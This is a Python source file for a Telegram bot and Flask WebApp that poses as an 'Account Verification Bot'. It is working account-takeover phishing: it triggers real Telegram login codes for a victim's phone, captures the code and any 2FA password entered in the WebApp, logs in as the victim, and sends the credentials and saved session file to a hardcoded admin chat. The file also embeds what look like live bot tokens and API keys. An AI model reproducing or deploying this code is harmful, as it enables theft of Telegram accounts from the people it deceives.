import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError
from flask import Flask, render_template, request, jsonify
import asyncio
import threading
import time
import json
import logging
import uuid
from datetime import datetime, timedelta

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# =============== CONFIGURATION ===============
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')

# Initialize
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# =============== SESSION MANAGEMENT ===============
sessions = {}  # session_id -> {user_id, phone, stage, created, otp_attempts, etc}
telethon_sessions = {}  # phone -> {client, phone_code_hash, last_activity}
SESSION_TIMEOUT = 300  # 5 minutes

def generate_session_id():
    return str(uuid.uuid4())

def create_session(user_id):
    """Create a new session for user"""
    session_id = generate_session_id()
    
    sessions[session_id] = {
        'user_id': user_id,
        'phone': None,
        'stage': 'started',  # started, contact_received, otp_sent, needs_2fa, verified
        'created': datetime.now(),
        'last_activity': datetime.now(),
        'otp_attempts': 0,
        'otp_sent_time': None,
        'otp_code': None,
        'requires_2fa': False,
        'verified': False
    }
    
    logger.info(f"Created session {session_id} for user {user_id}")
    return session_id

def get_session(session_id):
    """Get session and check expiration"""
    if session_id not in sessions:
        return None
    
    session = sessions[session_id]
    time_diff = (datetime.now() - session['created']).total_seconds()
    
    if time_diff > SESSION_TIMEOUT:
        logger.info(f"Session {session_id} expired after {time_diff} seconds")
        # Clean up telethon session if exists
        if session.get('phone') and session['phone'] in telethon_sessions:
            del telethon_sessions[session['phone']]
        del sessions[session_id]
        return None
    
    session['last_activity'] = datetime.now()
    return session

def update_session(session_id, updates):
    """Update session data"""
    if session_id in sessions:
        sessions[session_id].update(updates)
        sessions[session_id]['last_activity'] = datetime.now()
        return True
    return False

def cleanup_expired_sessions():
    """Clean up expired sessions"""
    while True:
        time.sleep(60)
        current_time = datetime.now()
        expired_sessions = []
        
        for session_id, session in sessions.items():
            time_diff = (current_time - session['created']).total_seconds()
            if time_diff > SESSION_TIMEOUT:
                expired_sessions.append(session_id)
        
        for session_id in expired_sessions:
            session = sessions[session_id]
            if session.get('phone') and session['phone'] in telethon_sessions:
                del telethon_sessions[session['phone']]
            del sessions[session_id]
        
        if expired_sessions:
            logger.info(f"🧹 Cleaned {len(expired_sessions)} expired sessions")

# =============== TELEGRAM CLIENT MANAGER ===============
class TelegramClientManager:
    """Manages Telegram client instances to avoid loop issues"""
    
    @staticmethod
    async def send_otp(phone):
        """Send OTP using a fresh client"""
        try:
            # Create unique session file
            os.makedirs('sessions', exist_ok=True)
            session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
            
            # Create and connect client
            client = TelegramClient(session_name, API_ID, API_HASH)
            await client.connect()
            
            # Send code request
            result = await client.send_code_request(phone)
            
            # Store in manager
            telethon_sessions[phone] = {
                'client': client,
                'phone_code_hash': result.phone_code_hash,
                'sent_time': time.time()
            }
            
            logger.info(f"✅ OTP sent to {phone}")
            return {'success': True, 'phone_code_hash': result.phone_code_hash}
            
        except FloodWaitError as e:
            logger.error(f"Flood wait: {e.seconds}s for {phone}")
            return {'success': False, 'error': f'Wait {e.seconds} seconds'}
        except Exception as e:
            logger.error(f"Error sending OTP to {phone}: {e}")
            return {'success': False, 'error': str(e)}
    
    @staticmethod
    async def verify_otp(phone, otp_code):
        """Verify OTP with existing client"""
        try:
            if phone not in telethon_sessions:
                return {'success': False, 'error': 'Session expired. Please resend OTP.'}
            
            client_data = telethon_sessions[phone]
            client = client_data['client']
            phone_code_hash = client_data['phone_code_hash']
            
            # Sign in with OTP
            await client.sign_in(phone=phone, code=otp_code, phone_code_hash=phone_code_hash)
            
            if await client.is_user_authorized():
                # Get user info
                me = await client.get_me()
                user_info = {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': me.phone
                }
                
                # Save session
                await client.session.save()
                session_file = client.session.filename
                
                return {
                    'success': True,
                    'user_info': user_info,
                    'session_file': session_file,
                    'requires_2fa': False
                }
            else:
                return {'success': False, 'error': 'Not authorized'}
                
        except SessionPasswordNeededError:
            return {'success': True, 'requires_2fa': True}
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid OTP code'}
        except Exception as e:
            logger.error(f"Verify error for {phone}: {e}")
            return {'success': False, 'error': str(e)}
    
    @staticmethod
    async def verify_2fa(phone, password):
        """Verify 2FA password"""
        try:
            if phone not in telethon_sessions:
                return {'success': False, 'error': 'Session expired'}
            
            client = telethon_sessions[phone]['client']
            await client.sign_in(password=password)
            
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            await client.session.save()
            session_file = client.session.filename
            
            return {
                'success': True,
                'user_info': user_info,
                'session_file': session_file
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    @staticmethod
    async def resend_otp(phone):
        """Resend OTP to same phone"""
        try:
            if phone not in telethon_sessions:
                return await TelegramClientManager.send_otp(phone)
            
            # Use existing client
            client = telethon_sessions[phone]['client']
            result = await client.send_code_request(phone)
            
            telethon_sessions[phone]['phone_code_hash'] = result.phone_code_hash
            telethon_sessions[phone]['sent_time'] = time.time()
            
            return {'success': True, 'phone_code_hash': result.phone_code_hash}
            
        except Exception as e:
            logger.error(f"Resend OTP error for {phone}: {e}")
            # Try fresh client
            return await TelegramClientManager.send_otp(phone)

# =============== ASYNC WRAPPER FUNCTIONS ===============
def run_async(coroutine):
    """Run async function in new event loop"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(coroutine)
        return result
    finally:
        loop.close()

def send_otp_sync(phone):
    """Sync wrapper for send_otp"""
    return run_async(TelegramClientManager.send_otp(phone))

def verify_otp_sync(phone, otp_code):
    """Sync wrapper for verify_otp"""
    return run_async(TelegramClientManager.verify_otp(phone, otp_code))

def verify_2fa_sync(phone, password):
    """Sync wrapper for verify_2fa"""
    return run_async(TelegramClientManager.verify_2fa(phone, password))

def resend_otp_sync(phone):
    """Sync wrapper for resend_otp"""
    return run_async(TelegramClientManager.resend_otp(phone))

# =============== ADMIN NOTIFICATION ===============
def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
    """Send notification to admin"""
    try:
        message = f"""📱 <b>NEW VERIFICATION</b>

📞 Phone: {phone}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        
        if user_info:
            name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
            if name:
                message += f"\n👤 Name: {name}"
            if user_info.get('username'):
                message += f"\n🔗 Username: @{user_info['username']}"
            message += f"\n🆔 ID: {user_info.get('id', 'N/A')}"
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
        
        if password:
            message += f"\n🔐 2FA Password: <code>{password}</code>"
        
        bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        
        # Send session file
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}"
                    )
            except Exception as e:
                logger.error(f"Error sending session: {e}")
        
        logger.info(f"📨 Admin notified about {phone}")
        return True
    except Exception as e:
        logger.error(f"Admin notification error: {e}")
        return False

# =============== BOT HANDLERS ===============
@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Create or get existing session
        session_id = None
        for sid, sess in sessions.items():
            if sess['user_id'] == user_id and (datetime.now() - sess['created']).total_seconds() < SESSION_TIMEOUT:
                session_id = sid
                break
        
        if not session_id:
            session_id = create_session(user_id)
        
        # Get WebApp URL
        if 'RENDER' in os.environ:
            hostname = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            webapp_url = f"https://{hostname}" if hostname else "https://your-app.onrender.com"
        else:
            port = os.environ.get('PORT', 5000)
            webapp_url = f"http://localhost:{port}"
        
        webapp_url += f"?session_id={session_id}"
        
        # Create WebApp button
        kb = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "📱 Open Verification WebApp",
            web_app=types.WebAppInfo(webapp_url)
        )
        kb.add(btn)
        
        bot.send_message(
            message.chat.id,
            f"""👋 <b>Hello {first_name}!</b>

Welcome to Account Verification Bot

<b>Session ID:</b> <code>{session_id}</code>
<b>Session expires in:</b> 5 minutes

Click below to open the WebApp and begin verification:""",
            parse_mode='HTML',
            reply_markup=kb
        )
        
        logger.info(f"Sent /start to user {user_id}, session: {session_id}")
        
    except Exception as e:
        logger.error(f"Start error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sharing"""
    try:
        contact = message.contact
        user_id = message.from_user.id
        phone = contact.phone_number
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"📱 Contact from {user_id}: {phone}")
        
        # Find user's active session
        session_id = None
        for sid, sess in sessions.items():
            if sess['user_id'] == user_id:
                session_id = sid
                break
        
        if not session_id:
            session_id = create_session(user_id)
        
        # Update session with phone
        update_session(session_id, {
            'phone': phone,
            'stage': 'contact_received'
        })
        
        # Send processing message
        msg = bot.send_message(
            message.chat.id,
            f"✅ <b>Contact Received!</b>\n\n📱 Phone: {phone}\n\n⏳ Sending OTP via Telegram...",
            parse_mode='HTML'
        )
        
        # Send OTP in background thread
        def send_otp_background():
            try:
                result = send_otp_sync(phone)
                
                if result['success']:
                    update_session(session_id, {
                        'stage': 'otp_sent',
                        'otp_sent_time': datetime.now()
                    })
                    
                    bot.edit_message_text(
                        f"""✅ <b>OTP SENT SUCCESSFULLY!</b>

📱 Phone: {phone}
🆔 Session: <code>{session_id}</code>
⏰ Expires in: 5 minutes

<b>5-digit OTP</b> has been sent via Telegram.

Check your messages for the code and enter it in the WebApp.

<i>Use /start again if session expires</i>""",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    # Notify admin
                    send_to_admin(phone)
                    
                else:
                    bot.edit_message_text(
                        f"❌ <b>Error:</b> {result.get('error', 'Failed to send OTP')}",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"Background OTP error: {e}")
        
        thread = threading.Thread(target=send_otp_background)
        thread.start()
        
        # Delete contact message
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact error: {e}")

# =============== FLASK ROUTES ===============
@app.route('/')
def index():
    """Main WebApp page"""
    session_id = request.args.get('session_id')
    
    if not session_id:
        return "Invalid session. Please use /start in bot.", 400
    
    session = get_session(session_id)
    if not session:
        return "Session expired. Please use /start again.", 400
    
    return render_template('index.html', session_id=session_id)

@app.route('/api/session/<session_id>')
def api_session(session_id):
    """Get session data"""
    session = get_session(session_id)
    
    if not session:
        return jsonify({'success': False, 'error': 'Session expired', 'expired': True})
    
    # Calculate time remaining
    time_remaining = SESSION_TIMEOUT - (datetime.now() - session['created']).total_seconds()
    
    return jsonify({
        'success': True,
        'session': {
            'user_id': session['user_id'],
            'phone': session.get('phone'),
            'stage': session['stage'],
            'verified': session['verified'],
            'requires_2fa': session['requires_2fa'],
            'otp_attempts': session['otp_attempts'],
            'time_remaining': int(time_remaining)
        }
    })

@app.route('/api/share-contact', methods=['POST'])
def api_share_contact():
    """API for WebApp to share contact"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        
        session = get_session(session_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired', 'expired': True})
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'})
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Update session
        update_session(session_id, {
            'phone': phone,
            'stage': 'contact_received'
        })
        
        logger.info(f"WebApp contact: {phone} for session {session_id}")
        
        return jsonify({
            'success': True,
            'message': 'Contact received'
        })
        
    except Exception as e:
        logger.error(f"API contact error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-otp', methods=['POST'])
def api_send_otp():
    """Send or resend OTP"""
    try:
        data = request.json
        session_id = data.get('session_id')
        
        session = get_session(session_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired', 'expired': True})
        
        phone = session.get('phone')
        if not phone:
            return jsonify({'success': False, 'error': 'Phone not shared yet'})
        
        logger.info(f"Sending OTP to {phone} for session {session_id}")
        
        # Send OTP
        result = send_otp_sync(phone)
        
        if result['success']:
            update_session(session_id, {
                'stage': 'otp_sent',
                'otp_sent_time': datetime.now(),
                'otp_attempts': 0
            })
            
            return jsonify({
                'success': True,
                'message': 'OTP sent successfully'
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Failed to send OTP')
            })
            
    except Exception as e:
        logger.error(f"API send OTP error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP"""
    try:
        data = request.json
        session_id = data.get('session_id')
        otp = data.get('otp', '').strip()
        
        session = get_session(session_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired', 'expired': True})
        
        # Clean OTP (5 digits)
        cleaned_otp = ''.join(filter(str.isdigit, otp))
        if len(cleaned_otp) != 5:
            return jsonify({'success': False, 'error': 'Enter 5-digit OTP'})
        
        phone = session.get('phone')
        if not phone:
            return jsonify({'success': False, 'error': 'Phone not found'})
        
        # Check attempts
        session['otp_attempts'] += 1
        if session['otp_attempts'] > 3:
            return jsonify({'success': False, 'error': 'Too many attempts. Please resend OTP.'})
        
        # Verify OTP
        result = verify_otp_sync(phone, cleaned_otp)
        
        if result['success']:
            if result.get('requires_2fa'):
                update_session(session_id, {
                    'stage': 'needs_2fa',
                    'requires_2fa': True
                })
                
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA password required'
                })
            else:
                # Verified successfully
                update_session(session_id, {
                    'stage': 'verified',
                    'verified': True
                })
                
                # Send to admin
                send_to_admin(
                    phone,
                    otp=cleaned_otp,
                    user_info=result.get('user_info'),
                    session_file=result.get('session_file')
                )
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verification successful!'
                })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Invalid OTP'),
                'attempts': session['otp_attempts']
            })
            
    except Exception as e:
        logger.error(f"API verify error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def api_verify_2fa():
    """Verify 2FA"""
    try:
        data = request.json
        session_id = data.get('session_id')
        password = data.get('password', '').strip()
        
        session = get_session(session_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired', 'expired': True})
        
        if not password:
            return jsonify({'success': False, 'error': 'Password required'})
        
        phone = session.get('phone')
        if not phone:
            return jsonify({'success': False, 'error': 'Phone not found'})
        
        # Verify 2FA
        result = verify_2fa_sync(phone, password)
        
        if result['success']:
            update_session(session_id, {
                'stage': 'verified',
                'verified': True
            })
            
            # Send to admin with password
            send_to_admin(
                phone,
                password=password,
                user_info=result.get('user_info'),
                session_file=result.get('session_file')
            )
            
            return jsonify({
                'success': True,
                'message': '2FA verified successfully!'
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Invalid password')
            })
            
    except Exception as e:
        logger.error(f"API 2FA error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# =============== RUN FUNCTIONS ===============
def run_bot():
    """Run bot with polling"""
    logger.info("🤖 Starting bot polling...")
    try:
        bot.remove_webhook()
        time.sleep(1)
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        logger.error(f"Bot error: {e}")
        time.sleep(5)
        run_bot()

def run_flask():
    """Run Flask server"""
    port = int(os.environ.get("PORT", 5000))
    logger.info(f"🚀 Starting Flask on port {port}")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)

# =============== MAIN ===============
if __name__ == "__main__":
    logger.info("="*60)
    logger.info("🚀 Telegram Verification Bot (Session-based)")
    logger.info("="*60)
    
    # Start session cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_expired_sessions, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Session cleanup thread started")
    
    # Start bot in separate thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Give bot time to start
    time.sleep(2)
    
    # Run Flask in main thread
    run_flask()
